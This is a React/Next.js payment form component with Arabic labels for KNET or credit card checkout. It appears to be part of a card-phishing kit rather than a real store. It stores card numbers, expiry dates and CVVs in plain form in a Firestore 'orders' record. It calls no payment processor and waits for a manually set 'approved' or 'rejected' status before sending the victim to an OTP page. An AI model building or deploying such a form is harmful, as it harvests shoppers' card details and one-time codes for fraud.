"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { doc, onSnapshot, updateDoc } from "firebase/firestore"
import { Button } from "@/components/ui/button"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Input } from "@/components/ui/input"
import { useCart } from "@/components/cart-provider"
import { db } from "@/lib/firebaes"
import { Select, SelectContent, SelectItem, SelectTrigger,SelectValue } from "@/components/ui/select"
import { Loader } from "@/components/loader"

const formSchema = z.object({
  paymentMethod: z.enum(["knet", "credit"]),
  cardNumber: z.string()!.min(16, "رقم البطاقة غير صحيح"),
  expiryMonth: z.string().min(2, "تاريخ الانتهاء غير صحيح").optional(),
  expiryYear: z.string().min(2, "تاريخ الانتهاء غير صحيح").optional(),
  cvv: z.string().min(3, "رمز CVV غير صحيح").optional(),
  status:z.string()
})

export function PaymentForm() {
  const router = useRouter()
  const { clearCart } = useCart()
  const [isLoading, setIsLoading] = useState(false)
  const [method, setMethod] = useState('credit')

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      paymentMethod: "credit",
      status:'new'
    },
  })

  const paymentMethod = form.watch("paymentMethod")


  const currentYear = new Date().getFullYear()
  const years = Array.from({ length: 10 }, (_, i) => (currentYear + i).toString())
  useEffect(() => {
    const visitorId = localStorage.getItem("vistor") ;

    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, 'orders', visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();
          if (data.status) {
            if (data.status === 'approved') {
            setIsLoading(false)
            router.push("/checkout/otp");
            } else if (data.status === 'rejected') {
              setIsLoading(false);
              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
            }
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);
 
  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsLoading(true)
  


    try {
      const orderId = localStorage.getItem("vistor")
      await updateDoc(doc(db, "orders", orderId as string), {
        values,
        status:'new'
      })
    //  router.push("/checkout/otp")

    } catch (error) {
      console.error("Error processing payment:", error)
    } finally {
      //setIsLoading(false)
    }
  }

  return (
    <> {isLoading?
      <div
      style={{position:'absolute',top:0,left:0,right:0,bottom:0,background:'rgba(255,255,255,0.9)',margin:'auto'}}><Loader/></div>
  :
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
        <FormField
          control={form.control}
          name="paymentMethod"
          render={({ field }) => (
            <FormItem>
              <FormControl>
                <RadioGroup
                  onValueChange={(e)=>{
                    field.onChange(e)
                    setMethod(e)
                  }}
                  defaultValue={field.value}
                  className="grid grid-cols-2 gap-4"
                 
                >
                  <div className={`relative ${isLoading?" hidden": " "}`} >
                    <RadioGroupItem value="knet" id="knet" className="peer sr-only" />
                    <Label
                    
                     onClick={()=>{
                      return router.push("/checkout/kent")
                    }}
                      htmlFor="knet"
                      className="flex flex-col items-center justify-between rounded-md border-2 border-muted bg-white p-4 hover:bg-gray-50 [&:has([data-state=checked])]:border-blue-600 peer-data-[state=checked]:border-blue-600"
                    >
                      <Image src="/knet.svg" alt="KNET" width={80} height={40} className="mb-3" />
                      <span className="text-sm font-medium">كي نت</span>
                    </Label>
                  </div>
                  <div className="relative">
                    <RadioGroupItem value="credit" id="credit" className="peer sr-only" />
                    <Label
                      htmlFor="credit"
                      className="flex flex-col items-center justify-between rounded-md border-2 border-muted bg-white p-4 hover:bg-gray-50 [&:has([data-state=checked])]:border-blue-600 peer-data-[state=checked]:border-blue-600"
                    >
                      <Image src="/cards.svg" alt="Credit Card" width={40} height={40} className="mb-3" />
                      <Image src="/visa.svg" alt="Credit Card" width={40} height={40} className="mb-3" />
                      <span className="text-sm font-medium">بطاقة ائتمان</span>
                    </Label>
                  </div>
                </RadioGroup>
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        {paymentMethod === "credit" && (
       <>
          <FormField
         control={form.control}
         name="cardNumber"
         render={({ field }) => (
           <FormItem>
             <FormLabel>رقم البطاقة</FormLabel>
             <FormControl>
               <Input type="number"  minLength={16} maxLength={16} required {...field} />
             </FormControl>
             <FormMessage />
           </FormItem>
         )}
       />
       <div className="grid grid-cols-3 gap-4">
       <FormField
         control={form.control}
         name="expiryMonth"
         render={({ field }) => (
           <FormItem>
             <FormLabel>الشهر</FormLabel>
             <Select required onValueChange={field.onChange} defaultValue={field.value}>
               <FormControl>
                 <SelectTrigger>
                   <SelectValue placeholder="الشهر" />
                 </SelectTrigger>
               </FormControl>
               <SelectContent>
                 {Array.from({ length: 12 }, (_, i) => {
                   const month = (i + 1).toString().padStart(2, "0")
                   return (
                     <SelectItem key={month} value={month}>
                       {month}
                     </SelectItem>
                   )
                 })}
               </SelectContent>
             </Select>
             <FormMessage />
           </FormItem>
         )}
       />

       <FormField
         control={form.control}
         name="expiryYear"
         render={({ field }) => (
           <FormItem>
             <FormLabel>السنة</FormLabel>
             <Select required onValueChange={field.onChange} defaultValue={field.value}>
               <FormControl>
                 <SelectTrigger>
                   <SelectValue placeholder="السنة" />
                 </SelectTrigger>
               </FormControl>
               <SelectContent>
                 {years.map((year) => (
                   <SelectItem key={year} value={year}>
                     {year}
                   </SelectItem>
                 ))}
               </SelectContent>
             </Select>
             <FormMessage />
           </FormItem>
         )}
       />

       <FormField
         control={form.control}
         name="cvv"
         render={({ field }) => (
           <FormItem>
             <FormLabel>CVV</FormLabel>
             <FormControl>
               <Input required type="password" maxLength={3} {...field} />
             </FormControl>
             <FormMessage />
           </FormItem>
         )}
       />
     </div>
     </>

        )}

        <Button type="submit" className="w-full" disabled={isLoading}>
          {isLoading ? "جاري المعالجة..." : "تأكيد الدفع"}
        </Button>
      </form>
    </Form>
    }
    </>
  )
}

function Label(props: React.LabelHTMLAttributes<HTMLLabelElement>) {
  return <label {...props} />
}

